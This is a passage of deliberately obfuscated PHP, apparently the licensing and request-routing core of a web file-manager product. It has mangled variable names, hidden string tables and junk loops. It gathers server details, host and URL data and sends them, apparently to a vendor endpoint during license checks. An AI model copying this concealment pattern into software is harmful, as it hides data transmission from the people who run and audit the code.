$Ä¼‚€Ù® =& $_SERVER[ ï©Şİµ]; $˜®³Ô‡ = explode($Ä¼‚€Ù®[0], trim($ˆÑ‘éÀ, $Ä¼‚€Ù®[0])); $œóÀ£ì£ = $íÆ×ğ€Ã[697]; if (!$œóÀ£ì£) { return; } $this->defaultModule = $˜®³Ô‡[0] ? $˜®³Ô‡[0] : $this->defaultModule; $this->defaultController = $˜®³Ô‡[1] ? $˜®³Ô‡[1] : $this->defaultController; $™ãÕğš¢ = $íÆ×ğ€Ã[698]; $this->defaultAction = $˜®³Ô‡[2] ? $˜®³Ô‡[2] : $this->defaultAction; $this->ytfqc8f24a94($Ä¼‚€Ù®[1], array($this, $Ä¼‚€Ù®[2])); } public function appRun($ÍõÅñ) { $ëÁşÒ¶ñ =& $_SERVER[ü¢ÙÊñÛ]; $Àª„áˆ =& $_SERVER[ ï©Şİµ]; $—–ƒ¼ì = explode($Àª„áˆ[0], $ÍõÅñ); $ñ ÏÛÛ = $ëÁşÒ¶ñ[699]; $×’€âÊ£ = strtolower($—–ƒ¼ì[0]); $µ…È·Ú— = $Àª„áˆ[3]; $à²ŠÒï› = $ëÁşÒ¶ñ[700]; if (!$à²ŠÒï›) { return; } if ($×’€âÊ£ == $Àª„áˆ[4]) { $µ…È·Ú— = $Àª„áˆ[5]; $—–ƒ¼ì[0] = $Àª„áˆ[6]; $—–ƒ¼ì[1] = $—–ƒ¼ì[1] . $Àª„áˆ[7]; $ÍõÅñ = join($Àª„áˆ[0], $—–ƒ¼ì); $ÍõÅñ = trim($ÍõÅñ, $Àª„áˆ[0]); } call_user_func(array($Àª„áˆ[8], $Àª„áˆ[9]), $µ…È·Ú— . $Àª„áˆ[10], $ÍõÅñ); ActionCall($ÍõÅñ); $ùä§ˆÌ = $ëÁşÒ¶ñ[701]; call_user_func(array($Àª„áˆ[8], $Àª„áˆ[9]), $µ…È·Ú— . $Àª„áˆ[11], $ÍõÅñ); } private function autorun() { $’âîö­ƒ =& $_SERVER[ü¢ÙÊñÛ]; $Û¤©ôı… =& $_SERVER[ ï©Şİµ]; global $config; $½’Ñ›˜É = $’âîö­ƒ[702]; while (strlen($½’Ñ›˜É) < $’âîö­ƒ[11]) { if (!$½’Ñ›˜É) { break; } $½’Ñ›˜É++; } if (count($config[$Û¤©ôı…[12]]) == 0) { return; } foreach ($config[$Û¤©ôı…[12]] as $š¸Æ­ï => $¾¶Çß) { $this->appRun($¾¶Çß); $‹§ô÷Õí = $’âîö­ƒ[703]; if (!$‹§ô÷Õí) { return; } } } private function vcabd922357c() { $ÍÓ”ĞšÀ =& $_SERVER[ü¢ÙÊñÛ]; $Ì¤ÌşÆ¾ =& $_SERVER[ ï©Şİµ]; $· ­ÄÛí = $Ì¤ÌşÆ¾[4]; $œ‰Èã÷ = $GLOBALS[$Ì¤ÌşÆ¾[13]][$Ì¤ÌşÆ¾[14]][0]; $·İ±†Ê³ = $ÍÓ”ĞšÀ[704]; if (!$·İ±†Ê³) { return; } if (!$œ‰Èã÷ || strlen($œ‰Èã÷) <= strlen($· ­ÄÛí)) { return; } if (strtolower(substr($œ‰Èã÷, -strlen($· ­ÄÛí))) != $· ­ÄÛí) { return; } $¼äôãëÌ = substr($œ‰Èã÷, 0, -strlen($· ­ÄÛí)); $ß°×ùš = array($Ì¤ÌşÆ¾[4], $¼äôãëÌ); $œÙöõ¥á = array_slice($GLOBALS[$Ì¤ÌşÆ¾[13]][$Ì¤ÌşÆ¾[14]], 1); $Õè¹ş = $ÍÓ”ĞšÀ[705]; if (strlen($Õè¹ş) < $ÍÓ”ĞšÀ[706]) { return; } $GLOBALS[$Ì¤ÌşÆ¾[13]][$Ì¤ÌşÆ¾[14]] = array_merge($ß°×ùš, $œÙöõ¥á); $ù‘Ü–× = $ÍÓ”ĞšÀ[707]; if (!$ù‘Ü–×) { die; } $GLOBALS[$Ì¤ÌşÆ¾[13]][$Ì¤ÌşÆ¾[15]] = implode($Ì¤ÌşÆ¾[0], $GLOBALS[$Ì¤ÌşÆ¾[13]][$Ì¤ÌşÆ¾[14]]); } private function sdve326fad3d() { $œ—œ·çÎ =& $_SERVER[ü¢ÙÊñÛ]; $Å„îÛô =& $_SERVER[ ï©Şİµ]; if ($GLOBALS[$Å„îÛô[13]][$Å„îÛô[15]] != $Å„îÛô[6]) { return; } $é±¿åÈù = $_SERVER[$Å„îÛô[16]]; $àùåÜ·ğ = $œ—œ·çÎ[708]; $Æ‹¤¦Îş = $Å„îÛô[17]; if (!strstr($é±¿åÈù, $Æ‹¤¦Îş)) { return; } $äØˆ¨®ı = strrpos($é±¿åÈù, $Æ‹¤¦Îş); $Ğ¹êáæ = $œ—œ·çÎ[709]; if (!$Ğ¹êáæ) { return; } $Ôäç—“ = substr($é±¿åÈù, $äØˆ¨®ı + strlen($Æ‹¤¦Îş)); preg_match_all($Å„îÛô[18], $Ôäç—“, $ËÒÜ‡Å¤); $Ôäç—“ = trim($ËÒÜ‡Å¤[0][0], $Å„îÛô[19]); $GLOBALS[$Å„îÛô[13]][$Å„îÛô[14]] = explode($Å„îÛô[19], $Ôäç—“); $ËÑ“ÖÚĞ = $œ—œ·çÎ[710]; $GLOBALS[$Å„îÛô[13]][$Å„îÛô[15]] = implode($Å„îÛô[0], $GLOBALS[$Å„îÛô[13]][$Å„îÛô[14]]); } public function run() { $ç·±ÓĞ‡ =& $_SERVER[ü¢ÙÊñÛ]; $ÖÄŸ³®¥ =& $_SERVER[ ï©Şİµ]; $this->sdve326fad3d(); $ºÆçİÙ— = $ç·±ÓĞ‡[711]; if (!$ºÆçİÙ—) { return; } $this->vcabd922357c(); $ƒß‡ı¼Œ = $ç·±ÓĞ‡[712]; while (strlen($ƒß‡ı¼Œ) < $ç·±ÓĞ‡[713]) { if (!$ƒß‡ı¼Œ) { break; } $ƒß‡ı¼Œ++; } $¥µá±áœ = $GLOBALS[$ÖÄŸ³®¥[13]][$ÖÄŸ³®¥[14]]; $‚Úúàê± = $ç·±ÓĞ‡[714]; if (!$‚Úúàê±) { return; } $ë¡”Â™ = $GLOBALS[$ÖÄŸ³®¥[13]][$ÖÄŸ³®¥[15]]; define($ÖÄŸ³®¥[20], isset($¥µá±áœ[0]) && $¥µá±áœ[0] ? $¥µá±áœ[0] : $this->defaultModule); define($ÖÄŸ³®¥[21], isset($¥µá±áœ[1]) && $¥µá±áœ[0] ? $¥µá±áœ[1] : $this->defaultController); define($ÖÄŸ³®¥[22], isset($¥µá±áœ[2]) && $¥µá±áœ[0] ? $¥µá±áœ[2] : $this->defaultAction); define($ÖÄŸ³®¥[23], MOD . $ÖÄŸ³®¥[0] . ST . $ÖÄŸ³®¥[0] . ACT); $_SERVER[$ÖÄŸ³®¥[24]] = strtolower(ACTION); $this->autorun(); if (count($¥µá±áœ) >= 3) { $this->appRun($ë¡”Â™); } else { $this->appRun(ACTION); } } private $twke1ca623a2 = array(); private $pnjea78001aa = ''; public function vngcc7d4aef2() { $Ñ•£„¥ =& $_SERVER[ü¢ÙÊñÛ]; $«Îş–”¢ =& $_SERVER[ ï©Şİµ]; $this->rdoh178d512b(); $¡íÃâÜƒ = $Ñ•£„¥[715]; if (strlen($¡íÃâÜƒ) < $Ñ•£„¥[716]) { return; } $this->vjfud28268c3(); $this->owzm58b9848a(); $ªª™·²÷ = $Ñ•£„¥[717]; while (strlen($ªª™·²÷) < $Ñ•£„¥[706]) { if (!$ªª™·²÷) { break; } $ªª™·²÷++; } $this->hreu5f95f05f(); $this->bqlh039321e9(); $¦É–Œ»º = $Ñ•£„¥[718]; if (strlen($¦É–Œ»º) < $Ñ•£„¥[716]) { return; } $this->beuy1968723d(); $this->njbk10b9bae4(); $¼«¹ˆâ = $Ñ•£„¥[719]; if (strlen($¼«¹ˆâ) < $Ñ•£„¥[11]) { die; } $this->ytfqc8f24a94($«Îş–”¢[25], array($this, $«Îş–”¢[26])); $±¾¼¢—´ = $Ñ•£„¥[720]; if (strlen($±¾¼¢—´) < $Ñ•£„¥[721]) { die; } $this->ytfqc8f24a94($«Îş–”¢[27], array($this, $«Îş–”¢[28])); $this->ytfqc8f24a94($«Îş–”¢[29], array($this, $«Îş–”¢[30])); $this->ytfqc8f24a94($«Îş–”¢[31], array($this, $«Îş–”¢[32])); } public function kqhn4a97b8c6($ƒá…ÒäÜ) { $ï€ƒßì° =& $_SERVER[ü¢ÙÊñÛ]; $°â‹ÇíÛ =& $_SERVER[ ï©Şİµ]; $€×…°–§ = Model($°â‹ÇíÛ[33])->get(); $’…ÍşÉ = array($°â‹ÇíÛ[34], $°â‹ÇíÛ[35], $°â‹ÇíÛ[36], $°â‹ÇíÛ[37], $°â‹ÇíÛ[38], $°â‹ÇíÛ[39], $°â‹ÇíÛ[40], $°â‹ÇíÛ[41], $°â‹ÇíÛ[42], $°â‹ÇíÛ[43], $°â‹ÇíÛ[44], $°â‹ÇíÛ[45], $°â‹ÇíÛ[46], $°â‹ÇíÛ[47], $°â‹ÇíÛ[48], $°â‹ÇíÛ[49], $°â‹ÇíÛ[50], $°â‹ÇíÛ[51], $°â‹ÇíÛ[52], $°â‹ÇíÛ[53], $°â‹ÇíÛ[54], $°â‹ÇíÛ[55], $°â‹ÇíÛ[56], $°â‹ÇíÛ[57], $°â‹ÇíÛ[58], $°â‹ÇíÛ[59], $°â‹ÇíÛ[60], $°â‹ÇíÛ[61], $°â‹ÇíÛ[62], $°â‹ÇíÛ[63], $°â‹ÇíÛ[64], $°â‹ÇíÛ[65], $°â‹ÇíÛ[66], $°â‹ÇíÛ[67], $°â‹ÇíÛ[68], $°â‹ÇíÛ[69], $°â‹ÇíÛ[70], $°â‹ÇíÛ[71], $°â‹ÇíÛ[72], $°â‹ÇíÛ[73], $°â‹ÇíÛ[74], $°â‹ÇíÛ[75], $°â‹ÇíÛ[76], $°â‹ÇíÛ[77], $°â‹ÇíÛ[78], $°â‹ÇíÛ[79], $°â‹ÇíÛ[80], $°â‹ÇíÛ[81], $°â‹ÇíÛ[82], $°â‹ÇíÛ[83], $°â‹ÇíÛ[84], $°â‹ÇíÛ[85]); $œòÎ½§¥ = $ï€ƒßì°[722]; foreach ($’…ÍşÉ as $ù÷µëÆ) { $­›“…Ì³ = $GLOBALS[$°â‹ÇíÛ[86]][$°â‹ÇíÛ[87]][$ù÷µëÆ]; $È¦ñ´²Ÿ = $ï€ƒßì°[723]; while (strlen($È¦ñ´²Ÿ) < $ï€ƒßì°[721]) { if (!$È¦ñ´²Ÿ) { break; } $È¦ñ´²Ÿ++; } if (isset($€×…°–§[$ù÷µëÆ])) { $­›“…Ì³ = $€×…°–§[$ù÷µëÆ]; } $ƒá…ÒäÜ[$°â‹ÇíÛ[88]][$°â‹ÇíÛ[89]][$ù÷µëÆ] = $­›“…Ì³; } $åáàßãÄ = $ƒá…ÒäÜ[$°â‹ÇíÛ[88]][$°â‹ÇíÛ[89]][$°â‹ÇíÛ[46]]; $çİÆªæ” = $ï€ƒßì°[724]; unset($ƒá…ÒäÜ[$°â‹ÇíÛ[88]][$°â‹ÇíÛ[90]][$°â‹ÇíÛ[91]]); unset($ƒá…ÒäÜ[$°â‹ÇíÛ[88]][$°â‹ÇíÛ[90]][$°â‹ÇíÛ[92]]); $×¼ÓÙÄñ = $ï€ƒßì°[725]; if (!$×¼ÓÙÄñ) { return; } unset($ƒá…ÒäÜ[$°â‹ÇíÛ[88]][$°â‹ÇíÛ[89]][$°â‹ÇíÛ[46]]); unset($ƒá…ÒäÜ[$°â‹ÇíÛ[88]][$°â‹ÇíÛ[89]][$°â‹ÇíÛ[93]]); $ƒá…ÒäÜ[$°â‹ÇíÛ[88]][$°â‹ÇíÛ[89]][$°â‹ÇíÛ[94]] = array($°â‹ÇíÛ[95] => (int) $åáàßãÄ[$°â‹ÇíÛ[96]], $°â‹ÇíÛ[97] => (int) _get($åáàßãÄ, $°â‹ÇíÛ[98], 0)); $³¾•ªğû = $ï€ƒßì°[726]; if (!$³¾•ªğû) { die; } $È·´ãß = substr(md5($°â‹ÇíÛ[99] . get_client_ip() . $€×…°–§[$°â‹ÇíÛ[100]]), 0, 15); $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[102]] = Mcrypt::encode(Session::sign(), $È·´ãß, 3600 * 24); $Ñå½ìÂÎ = $ï€ƒßì°[727]; while ($Ñå½ìÂÎ < $ï€ƒßì°[716]) { if ($Ñå½ìÂÎ >= 0) { break; } $Ñå½ìÂÎ++; } $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[103]] = Action($°â‹ÇíÛ[104])->accessToken(); $İÇÆˆôÒ = $ï€ƒßì°[728]; if (!$İÇÆˆôÒ) { return; } $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[105]] = md5($_SERVER[$°â‹ÇíÛ[106]] . $€×…°–§[$°â‹ÇíÛ[100]]); $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[107]] = base64_encode(serverInfo()); $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[108]] = $this->pnjea78001aa; if ($€×…°–§[$°â‹ÇíÛ[108]] != $°â‹ÇíÛ[109]) { $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[110]] = $€×…°–§[$°â‹ÇíÛ[110]]; $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[111]] = $€×…°–§[$°â‹ÇíÛ[111]]; $ç°ô¸êš = rand_string(10) . $this->pnjea78001aa . rand_string(5); $ƒá…ÒäÜ[$°â‹ÇíÛ[88]][$°â‹ÇíÛ[112]][$°â‹ÇíÛ[113]] = $this->kydh1a3981ac($ç°ô¸êš, $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[105]]); } if ($this->pnjea78001aa == $°â‹ÇíÛ[109]) { $ƒá…ÒäÜ[$°â‹ÇíÛ[88]][$°â‹ÇíÛ[89]][$°â‹ÇíÛ[94]][$°â‹ÇíÛ[98]] = 0; } $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[114]] = $this->versionPluginFilter(); $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[115]] = _get($this->twke1ca623a2, $°â‹ÇíÛ[116], $°â‹ÇíÛ[6]); $³Ø“¤’Å = $ï€ƒßì°[729]; if (KodUser::isRoot() && $this->config[$°â‹ÇíÛ[117]]) { $ƒá…ÒäÜ[$°â‹ÇíÛ[101]][$°â‹ÇíÛ[118]] = WEB_ROOT; } return $ƒá…ÒäÜ; } private function beuy1968723d() { $ı€¶ÏÊ =& $_SERVER[ü¢ÙÊñÛ]; $‡úûâÂø =& $_SERVER[ ï©Şİµ]; $ÛÏ…×ËÔ = $_SERVER[$‡úûâÂø[24]] == $‡úûâÂø[119]; $¢ı«Çè¸ = $ı€¶ÏÊ[730]; while (strlen($¢ı«Çè¸) < $ı€¶ÏÊ[716]) { if (!$¢ı«Çè¸) { break; } $¢ı«Çè¸++; } if ($_SERVER[$‡úûâÂø[24]] == $‡úûâÂø[120] && $_GET[$‡úûâÂø[121]] == $‡úûâÂø[122]) { $ÛÏ…×ËÔ = !0; } if ($ÛÏ…×ËÔ) { $óÓ±öÅ = array($‡úûâÂø[108] => $this->pnjea78001aa, $‡úûâÂø[123] => $this->zhxr89b51120(), $‡úûâÂø[124] => Model($‡úûâÂø[125])->count()); if ($this->pnjea78001aa != $‡úûâÂø[109]) { $ÀÖÑÍ–¶ = _get($this->twke1ca623a2, $‡úûâÂø[126]); if ($ÀÖÑÍ–¶) { $óÓ±öÅ[$‡úûâÂø[127]] = $ÀÖÑÍ–¶; $óÓ±öÅ[$‡úûâÂø[128]] = strtotime(_get($this->twke1ca623a2, $‡úûâÂø[129])); $óÓ±öÅ[$‡úûâÂø[130]] = _get($this->twke1ca623a2, $‡úûâÂø[116]); } $§Ì’š’å = Model($‡úûâÂø[33])->get($‡úûâÂø[131], $‡úûâÂø[6], !0); if (is_string($§Ì’š’å) && substr($§Ì’š’å, 0, 1) == $‡úûâÂø[132]) { $§Ì’š’å = json_decode_force($§Ì’š’å); } if (is_array($§Ì’š’å) && $§Ì’š’å[$‡úûâÂø[133]] && strstr($§Ì’š’å[$‡úûâÂø[133]], $‡úûâÂø[134])) { $ñ³ƒéÖ¡ = explode($‡úûâÂø[134], $§Ì’š’å[$‡úûâÂø[133]]); $óÓ±öÅ[$‡úûâÂø[135]] = $ñ³ƒéÖ¡[0]; } } $óÓ±öÅ = $this->lobsa866628f(json_encode($óÓ±öÅ), md5($‡úûâÂø[136])); $™Í„¥³² = $ı€¶ÏÊ[731]; if (!$™Í„¥³²) { die; } $‡«‰‚‰ï = array($‡úûâÂø[137] => $óÓ±öÅ); call_user_func(array($‡úûâÂø[138], $‡úûâÂø[139]), $‡«‰‚‰ï); } if ($this->pnjea78001aa == $‡úûâÂø[109]) { return; } $ù§“õèô = array($‡úûâÂø[140], $‡úûâÂø[141], $‡úûâÂø[142], $‡úûâÂø[143], $‡úûâÂø[144], $‡úûâÂø[145]); $¹Õûî‹€ = Model($‡úûâÂø[33])->get(); $‡«‰‚‰ï = array($‡úûâÂø[146] => $¹Õûî‹€[$‡úûâÂø[34]], $‡úûâÂø[147] => $¹Õûî‹€[$‡úûâÂø[35]], $‡úûâÂø[148] => $‡úûâÂø[6]); foreach ($ù§“õèô as $¯¦ÅÎØ) { if (!isset($¹Õûî‹€[$¯¦ÅÎØ]) || !$¹Õûî‹€[$¯¦ÅÎØ]) { continue; } $‡«‰‚‰ï[$¯¦ÅÎØ] = $¹Õûî‹€[$¯¦ÅÎØ]; $•ÔÔáËñ = $ı€¶ÏÊ[732]; if (strlen($•ÔÔáËñ) < $ı€¶ÏÊ[721]) { die; } } call_user_func(array($‡úûâÂø[138], $‡úûâÂø[139]), $‡«‰‚‰ï); $±“Ş¤Ø‹ = $ı€¶ÏÊ[733]; } private function hreu5f95f05f() { $Œ¨Ÿü— =& $_SERVER[ü¢ÙÊñÛ]; $ˆÆ‹À† =& $_SERVER[ ï©Şİµ]; if ($_SERVER[$ˆÆ‹À†[24]] != $ˆÆ‹À†[149]) { return; } if (!KodUser::isRoot()) { die; } $¤¾ÖÏó = $GLOBALS[$ˆÆ‹À†[13]]; if (isset($¤¾ÖÏó[$ˆÆ‹À†[150]])) { $this->teom4777a852(); die; } if (isset($¤¾ÖÏó[$ˆÆ‹À†[151]]) && isset($¤¾ÖÏó[$ˆÆ‹À†[151]]) == $ˆÆ‹À†[122]) { $¤¾ÖÏó[$ˆÆ‹À†[152]] = Model($ˆÆ‹À†[33])->get($ˆÆ‹À†[153]); } if (!isset($¤¾ÖÏó[$ˆÆ‹À†[152]]) || strlen($¤¾ÖÏó[$ˆÆ‹À†[152]]) != 16) { show_json($ˆÆ‹À†[154] . $¤¾ÖÏó[$ˆÆ‹À†[152]], !1); } $ìòØ‚¥ = Model($ˆÆ‹À†[33])->get($ˆÆ‹À†[100]); $¼Ñ…†ï‹ = md5($_SERVER[$ˆÆ‹À†[106]] . $ìòØ‚¥); $Ö»„ÃÅË = $Œ¨Ÿü—[734]; $Ü÷Ô˜ßí = array($ˆÆ‹À†[152] => $¤¾ÖÏó[$ˆÆ‹À†[152]], $ˆÆ‹À†[155] => rand_string(16), $ˆÆ‹À†[156] => $ˆÆ‹À†[136], $ˆÆ‹À†[157] => $ˆÆ‹À†[158], $ˆÆ‹À†[159] => $_SERVER[$ˆÆ‹À†[160]], $ˆÆ‹À†[161] => $_SERVER[$ˆÆ‹À†[162]], $ˆÆ‹À†[163] => $_SERVER[$ˆÆ‹À†[164]], $ˆÆ‹À†[105] => $¼Ñ…†ï‹, $ˆÆ‹À†[165] => Model($ˆÆ‹À†[33])->get($ˆÆ‹À†[131])); if (isset($¤¾ÖÏó[$ˆÆ‹À†[151]]) && isset($¤¾ÖÏó[$ˆÆ‹À†[151]]) == $ˆÆ‹À†[122]) { $Ü÷Ô˜ßí[$ˆÆ‹À†[151]] = md5($Ü÷Ô˜ßí[$ˆÆ‹À†[152]] . $ˆÆ‹À†[166] . $Ü÷Ô˜ßí[$ˆÆ‹À†[155]]); } if ($¤¾ÖÏó[$ˆÆ‹À†[167]] == $ˆÆ‹À†[168]) { $œ‹ˆòÇ = $this->lobsa866628f($¼Ñ…†ï‹, $ˆÆ‹À†[169]); $øºÜêİ° = $this->kydh1a3981ac(json_encode($Ü÷Ô˜ßí), $¼Ñ…†ï‹ . $ˆÆ‹À†[170], 3); $øºÜêİ° = $øºÜêİ° . $ˆÆ‹À†[171] . $_SERVER[$ˆÆ‹À†[160]]; $–½ìˆ×Å = $this->yibn3c5477b0($ˆÆ‹À†[172] . $œ‹ˆòÇ . $ˆÆ‹À†[173] . $øºÜêİ°, -1); show_json($–½ìˆ×Å, !0); } else { if ($¤¾ÖÏó[$ˆÆ‹À†[167]] == $ˆÆ‹À†[174]) { $»á–ˆ“ = substr(md5($ˆÆ‹À†[175] . $¼Ñ…†ï‹), 12, 15) . $ˆÆ‹À†[176]; $øºÜêİ° = $this->syjw1b668d35(trim($¤¾ÖÏó[$ˆÆ‹À†[177]]), $»á–ˆ“, 2); $¡‡Ã¶ğ = json_decode($øºÜêİ°, !0); if (!is_array($¡‡Ã¶ğ) || !is_array($¡‡Ã¶ğ[$ˆÆ‹À†[178]]) || $¡‡Ã¶ğ[$ˆÆ‹À†[152]] != !0) { $ÙÉÏ»› = $ˆÆ‹À†[179]; $ÈÁÒ—› = $¡‡Ã¶ğ[$ˆÆ‹À†[178]] ? $ˆÆ‹À†[180] . $¡‡Ã¶ğ[$ˆÆ‹À†[178]] : $ÙÉÏ»›; show_json($ÈÁÒ—›, !1); } else { $Ü÷Ô˜ßí[$ˆÆ‹À†[155]] = $¡‡Ã¶ğ[$ˆÆ‹À†[178]][$ˆÆ‹À†[181]]; } } else { $¡‡Ã¶ğ = $this->yibn3c5477b0($ˆÆ‹À†[182], $Ü÷Ô˜ßí, 10); } } if (!is_array($¡‡Ã¶ğ) || !is_array($¡‡Ã¶ğ[$ˆÆ‹À†[178]]) || $¡‡Ã¶ğ[$ˆÆ‹À†[152]] != !0) { $ÙÉÏ»› = LNG($ˆÆ‹À†[183]); $ÈÁÒ—› = $¡‡Ã¶ğ[$ˆÆ‹À†[178]] ? $ˆÆ‹À†[180] . $¡‡Ã¶ğ[$ˆÆ‹À†[178]] : $ÙÉÏ»›; show_json($ÈÁÒ—›, !1); } $ï®Şê‡³ = $¡‡Ã¶ğ[$ˆÆ‹À†[178]]; $îÀ·ŠÉã = $this->rdcy1f59fbec($ï®Şê‡³[$ˆÆ‹À†[184]]); if (!$îÀ·ŠÉã || $îÀ·ŠÉã != $ï®Şê‡³[$ˆÆ‹À†[129]]) { $‘Í¡˜¸‡ = array($ˆÆ‹À†[185] => Model($ˆÆ‹À†[33])->get($ˆÆ‹À†[100]), $ˆÆ‹À†[186] => $_SERVER[$ˆÆ‹À†[106]], $ˆÆ‹À†[187] => this_url(), $ˆÆ‹À†[161] => $_SERVER[$ˆÆ‹À†[162]]); $øºÜêİ° = $this->xult27f7f681(json_encode($‘Í¡˜¸‡)); $this->yibn3c5477b0($ˆÆ‹À†[188] . $øºÜêİ°); show_json(LNG($ˆÆ‹À†[189]), !0); } $ÎÔÛÛ¹ú = array($ˆÆ‹À†[153] => $ï®Şê‡³[$ˆÆ‹À†[190]], $ˆÆ‹À†[191] => $ï®Şê‡³[$ˆÆ‹À†[192]], $ˆÆ‹À†[193] => rand_string(16), $ˆÆ‹À†[108] => $ï®Şê‡³[$ˆÆ‹À†[194]]); if ($Ü÷Ô˜ßí[$ˆÆ‹À†[155]]) { $ÎÔÛÛ¹ú[$ˆÆ‹À†[193]] = $Ü÷Ô˜ßí[$ˆÆ‹À†[155]]; } $şÜÚş­ = substr(md5($ÎÔÛÛ¹ú[$ˆÆ‹À†[191]]), 10, 10); $ùŠË‹Ú² = $şÜÚş­ . $ÎÔÛÛ¹ú[$ˆÆ‹À†[108]] . $ÎÔÛÛ¹ú[$ˆÆ‹À†[193]]; $ÎÔÛÛ¹ú[$ˆÆ‹À†[110]] = strrev(base64_encode($this->lobsa866628f($ùŠË‹Ú², $ˆÆ‹À†[195]))); $ò—æíÏ« = rand_string(16); $„ùğ¡İ = $ò—æíÏ« . $ÎÔÛÛ¹ú[$ˆÆ‹À†[108]] . $this->lobsa866628f(md5($ÎÔÛÛ¹ú[$ˆÆ‹À†[153]]), $ò—æíÏ«); $ÎÔÛÛ¹ú[$ˆÆ‹À†[111]] = base64_encode(strrev($this->lobsa866628f($„ùğ¡İ, $ˆÆ‹À†[196]))); $“Æ“ò“Ï = $Œ¨Ÿü—[735]; if ($ï®Şê‡³[$ˆÆ‹À†[197]] && $ï®Şê‡³[$ˆÆ‹À†[197]] >= 1) { Model($ˆÆ‹À†[33])->setDeep($ˆÆ‹À†[198], $ˆÆ‹À†[122]); } Model($ˆÆ‹À†[33])->set($ÎÔÛÛ¹ú); $Ñ»ƒóËì = md5($_SERVER[$ˆÆ‹À†[106]] . strrev($ìòØ‚¥) . $ÎÔÛÛ¹ú[$ˆÆ‹À†[191]]); $ø•Ø‹›œ = $Œ¨Ÿü—[736]; if (!$ø•Ø‹›œ) { die; } $ºãÎƒ¿ = strrev(substr($Ñ»ƒóËì, 10, 16)); $ıÀš¼ì“ = $this->kydh1a3981ac(json_encode($ï®Şê‡³), $Ñ»ƒóËì); $ûŸïÄùí = array_to_keyvalue(Model($ˆÆ‹À†[7])->listData(), $ˆÆ‹À†[199]); $³ú÷Ğ = $ûŸïÄùí[$ˆÆ‹À†[200]]; $ĞÈÜğÂÌ = array(); $ĞÈÜğÂÌ[$ºãÎƒ¿] = $ıÀš¼ì“; $îº²Óë± = $Œ¨Ÿü—[737]; if (strlen($îº²Óë±) < $Œ¨Ÿü—[721]) { die; } Model($ˆÆ‹À†[7])->update($³ú÷Ğ[$ˆÆ‹À†[201]], array($ˆÆ‹À†[202] => $ĞÈÜğÂÌ)); $this->twke1ca623a2 = $ï®Şê‡³; $Øµİû˜§ = $Œ¨Ÿü—[738]; if (strlen($Øµİû˜§) < $Œ¨Ÿü—[716]) { return; } $this->pnjea78001aa = $ÎÔÛÛ¹ú[$ˆÆ‹À†[108]]; $ä‘È¤‘ = $Œ¨Ÿü—[739]; $this->licenseRegistSuccess(); $šçİé¤ = $Œ¨Ÿü—[740]; while (strlen($šçİé¤) < $Œ¨Ÿü—[716]) { if (!$šçİé¤) { break; } $šçİé¤++; } Cache::set($ˆÆ‹À†[203] . md5($ìòØ‚¥ . $ˆÆ‹À†[204]), $ˆÆ‹À†[6]); show_json(LNG($ˆÆ‹À†[189]), !0); } private function licenseRegistSuccess() { $²Æ»Ì ş =& $_SERVER[ ï©Şİµ]; $ÎÒè úŸ = Model($²Æ»Ì ş[33])->get(); if ($ÎÒè úŸ[$²Æ»Ì ş[63]] != $²Æ»Ì ş[122]) { Model($²Æ»Ì ş[33])->set($²Æ»Ì ş[63], $²Æ»Ì ş[122]); } Action($²Æ»Ì ş[205])->initStart(!0); } private function teom4777a852() { $²†‚ã‘¼ =& $_SERVER[ü¢ÙÊñÛ]; $ÈÊ†­¥¼ =& $_SERVER[ ï©Şİµ]; Model($ÈÊ†­¥¼[33])->set(array($ÈÊ†­¥¼[153] => $ÈÊ†­¥¼[6], $ÈÊ†­¥¼[191] => $ÈÊ†­¥¼[6], $ÈÊ†­¥¼[108] => $ÈÊ†­¥¼[109], $ÈÊ†­¥¼[110] => $ÈÊ†­¥¼[6], $ÈÊ†­¥¼[111] => $ÈÊ†­¥¼[6])); Model($ÈÊ†­¥¼[33])->setDeep($ÈÊ†­¥¼[198], $ÈÊ†­¥¼[206]); $±•ãÍ†© = $²†‚ã‘¼[741]; if (strlen($±•ãÍ†©) < $²†‚ã‘¼[721]) { return; } $this->twke1ca623a2 = array(); $this->pnjea78001aa = $ÈÊ†­¥¼[109]; $µĞ™î¬£ = $²†‚ã‘¼[742]; while (strlen($µĞ™î¬£) < $²†‚ã‘¼[706]) { if (!$µĞ™î¬£) { break; } $µĞ™î¬£++; } } private function rdoh178d512b() { $«å‰‰ãß =& $_SERVER[ü¢ÙÊñÛ]; $İÙ³Ğô¬ =& $_SERVER[ ï©Şİµ]; $_SERVER[$İÙ³Ğô¬[162]] = _get($_SERVER, $İÙ³Ğô¬[162], APP_HOST); $this->pnjea78001aa = $İÙ³Ğô¬[109]; $æ‚µƒ¢‡ = $«å‰‰ãß[743]; $‹ŞÎ·¦ = Model($İÙ³Ğô¬[33])->get(); if ($‹ŞÎ·¦[$İÙ³Ğô¬[108]] == $İÙ³Ğô¬[109]) { return; } $üíüß¤ = Model($İÙ³Ğô¬[33])->get($İÙ³Ğô¬[100]); $œ§İ«Ÿ = $İÙ³Ğô¬[203] . md5($üíüß¤ . $İÙ³Ğô¬[204]); $—²¾¶çª = Cache::get($œ§İ«Ÿ); $ÓõùĞÆ = $«å‰‰ãß[744]; while (strlen($ÓõùĞÆ) < $«å‰‰ãß[11]) { if (!$ÓõùĞÆ) { break; } $ÓõùĞÆ++; } if (!is_array($—²¾¶çª) || !isset($—²¾¶çª[$İÙ³Ğô¬[207]]) || time() - $—²¾¶çª[$İÙ³Ğô¬[207]] >= 60) { $Ğ•À§·½ = Model($İÙ³Ğô¬[7])->loadList(); $ÀŸœ†áğ = $Ğ•À§·½[$İÙ³Ğô¬[200]]; $ÉÅû„½ = md5($_SERVER[$İÙ³Ğô¬[106]] . strrev($üíüß¤) . $‹ŞÎ·¦[$İÙ³Ğô¬[191]]); $ó°ğë® = strrev(substr($ÉÅû„½, 10, 16)); $—²¾¶çª = 